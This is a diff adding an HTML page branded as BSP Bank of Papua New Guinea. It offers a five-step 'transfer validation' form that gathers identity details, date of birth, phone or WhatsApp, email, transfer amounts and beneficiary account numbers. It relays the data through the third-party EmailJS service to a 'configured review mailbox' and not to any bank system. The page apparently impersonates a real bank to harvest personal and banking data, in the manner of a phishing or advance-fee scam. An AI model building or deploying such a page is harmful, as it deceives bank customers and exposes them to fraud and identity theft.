@@ -1,0 +1,202 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>BSP Bank | Transfer Validation</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+
+<body>
+    <header>
+        <a class="brand"><span>BSP BANK<small>BANK • PAPUA NEW GUINEA</small></span></a><span>🇵🇬 &nbsp;
+            Secure transfer request</span>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="hero-text">
+                <small>PNG PAYMENT SERVICES</small>
+                <h1>Transfer <em>Validation</em> (T&C)</h1>
+                <p>A professional multi-step client workflow for submitting and reviewing a transfer validation request.
+                </p>
+                <div class="ticks">✓ Guided form &nbsp; ✓ Review before submission &nbsp; ✓ Email notification</div>
+            </div>
+            <div class="card">
+                
+            </div>
+        </section>
+
+        <nav class="steps" aria-label="Form progress">
+            <div class="step active" data-step="1"><b>Client</b></div><i></i>
+            <div class="step" data-step="2"><b>Transfer</b></div><i></i>
+            <div class="step" data-step="3"><b>Beneficiary</b></div><i></i>
+            <div class="step" data-step="4"><b>Compliance</b></div><i></i>
+            <div class="step" data-step="5"><b>Review</b></div>
+        </nav>
+
+        <section class="layout">
+            <form id="form" class="panel" novalidate>
+                <div id="alert"></div>
+
+                <section class="form-step active" data-panel="1">
+                    <div class="title">
+                        <div><small>STEP 01</small>
+                            <h2>Client information</h2>
+                            <p>Tell us who is submitting this transfer request.</p>
+                        </div><span>* Required</span>
+                    </div>
+                    <div class="grid">
+                        <label>First name *<input name="first_name" required></label><label>Last name *<input
+                                name="last_name" required></label>
+                        <label>Date of birth *<input name="date_of_birth" type="date"
+                                required></label><label>Nationality *<input name="nationality" value="Papua New Guinean"
+                                required></label>
+                        <label>Province *<select name="province" id="province" required>
+                                <option value="">Select province</option>
+                            </select></label><label>District<input name="district"></label>
+                    
+                        <label>Phone/Whatsapp *<input name="phone" type="tel" required
+                                placeholder="+675 ..."></label><label>Email *<input name="email" type="email"
+                                required></label>
+                        
+                    </div>
+                </section>
+
+                <section class="form-step" data-panel="2">
+                    <div class="title">
+                        <div><small>STEP 02</small>
+                            <h2>Transfer details</h2>
+                            <p>Select the payment type and provide the transaction details.</p>
+                        </div><span>* Required</span>
+                    </div>
+                    <div class="types">
+                        <label class="selected"><input type="radio" name="transfer_type" value="Domestic Transfer"
+                                checked> <strong>Domestic</strong><small>PNG transfer</small></label>
+                        <label><input type="radio" name="transfer_type" value="International Telegraphic Transfer">
+                            <strong>International</strong><small>Overseas payment</small></label>
+                        <label><input type="radio" name="transfer_type" value="RTGS / High Value"> <strong>RTGS / High
+                                Value</strong><small>Priority settlement</small></label>
+                        <label><input type="radio" name="transfer_type" value="Direct Credit"> <strong>Direct
+                                Credit</strong><small>Account credit</small></label>
+                    </div>
+                    <div class="grid">
+                        <label>Transfer date *<input name="transfer_date"
+                                type="date" required></label>
+                        <label>Amount *<input name="amount" type="number" min=".01" step=".01" required></label>
+                        <label>Currency *<select name="currency" required>
+                                <option value="">Select</option>
+                                <option>PGK — Papua New Guinea Kina</option>
+                                <option>AUD — Australian Dollar</option>
+                                <option>USD — US Dollar</option>
+                                <option>NZD — New Zealand Dollar</option>
+                                <option>EUR — Euro</option>
+                                <option>GBP — Pound Sterling</option>
+                            </select></label>
+                        
+                        
+                    </div>
+        
+                </section>
+
+                <section class="form-step" data-panel="3">
+                    <div class="title">
+                        <div><small>STEP 03</small>
+                            <h2>Sender & beneficiary</h2>
+                            <p>Provide the account and beneficiary information.</p>
+                        </div><span>* Required</span>
+                    </div>
+                    
+                    <h3 class="sub">Beneficiary details</h3>
+                    <div class="grid">
+                        <label>Account name *<input name="beneficiary_name" required></label><label>Account number
+                             *<input name="beneficiary_account" required></label>
+                        <label>Beneficiary branch<input name="beneficiary_branch"></label>
+                        <label>Country *<input name="beneficiary_country" value="Papua New Guinea"
+                                required></label>
+                    
+                    </div>
+                </section>
+
+                <section class="form-step" data-panel="4">
+                    <div class="title">
+                        <div><small>STEP 04</small>
+                            <h2>Compliance & declarations</h2>
+                            <p>Provide the information needed for validation and compliance review.</p>
+                        </div><span>* Required</span>
+                    </div>
+                    
+                    <div class="checks">
+                        <label><input type="checkbox" name="accurate" required> I confirm that the information supplied
+                            is accurate and complete.</label>
+                        <label><input type="checkbox" name="authorised" required> I confirm that I am authorised to
+                            request this transfer.</label>
+                        <label><input type="checkbox" name="legitimate" required> I confirm that the transfer has a
+                            legitimate purpose and lawful source of funds.</label>
+                        <label><input type="checkbox" name="compliance" required> I understand that the request may be
+                            subject to KYC, AML/CTF, sanctions, fraud and transaction monitoring checks.</label>
+                        <label><input type="checkbox" name="documents"> I agree to provide supporting documents if
+                            requested.</label>
+                    </div>
+                </section>
+
+                <section class="form-step" data-panel="5">
+                    <div class="title">
+                        <div><small>STEP 05</small>
+                            <h2>Review & confirmation</h2>
+                            <p>Check every detail before submitting your validation request.</p>
+                        </div>
+                    </div>
+                    <div id="review" class="review"></div>
+                    <div class="confirm-box"><input id="finalConfirm" type="checkbox" required><label
+                            for="finalConfirm">I have reviewed the information above and confirm that it is
+                            correct.</label></div>
+                </section>
+
+                <div class="actions">
+                    <button type="button" id="back" class="secondary">← Back</button>
+                    <button type="button" id="next">Continue →</button>
+                    <button type="submit" id="submit" class="primary">Submit validation</button>
+                </div>
+                <p class="disclaimer">BSP BANK.</p>
+            </form>
+
+            <aside>
+                <div class="side"><small>YOUR PROGRESS</small>
+                    <h3>Five-step validation</h3>
+                    <ol>
+                        <li>Client information</li>
+                        <li>Transfer details</li>
+                        <li>Sender & beneficiary</li>
+                        <li>Compliance & declarations</li>
+                        <li>Review & confirmation</li>
+                    </ol>
+                </div>
+                <div class="side"><small>PNG COVERAGE</small>
+                    <h3>Province selection</h3>
+                    <p>All provincial-level units are available.</p>
+                    <div id="provinceList"></div>
+                </div>
+                <div class="side"><b>Need help?</b>
+                    <p>Use an official bank contact channel for assistance. Never send authentication credentials by
+                        email.</p>
+                </div>
+            </aside>
+        </section>
+    </main>
+
+    <footer>BSP BANK </footer>
+    <div id="modal" class="modal">
+        <div class="modalbox"><button id="close">×</button><b class="ok">✓</b><small>REQUEST RECEIVED</small>
+            <h2>Validation submitted</h2>
+            <p>Your request has been sent to the configured review mailbox.</p><strong id="ref"></strong><button
+                id="done">Done</button>
+        </div>
+    </div>
+    <script src="js/config.js"></script>
+    <script src="js/app.js"></script>
+</body>
+
+</html>
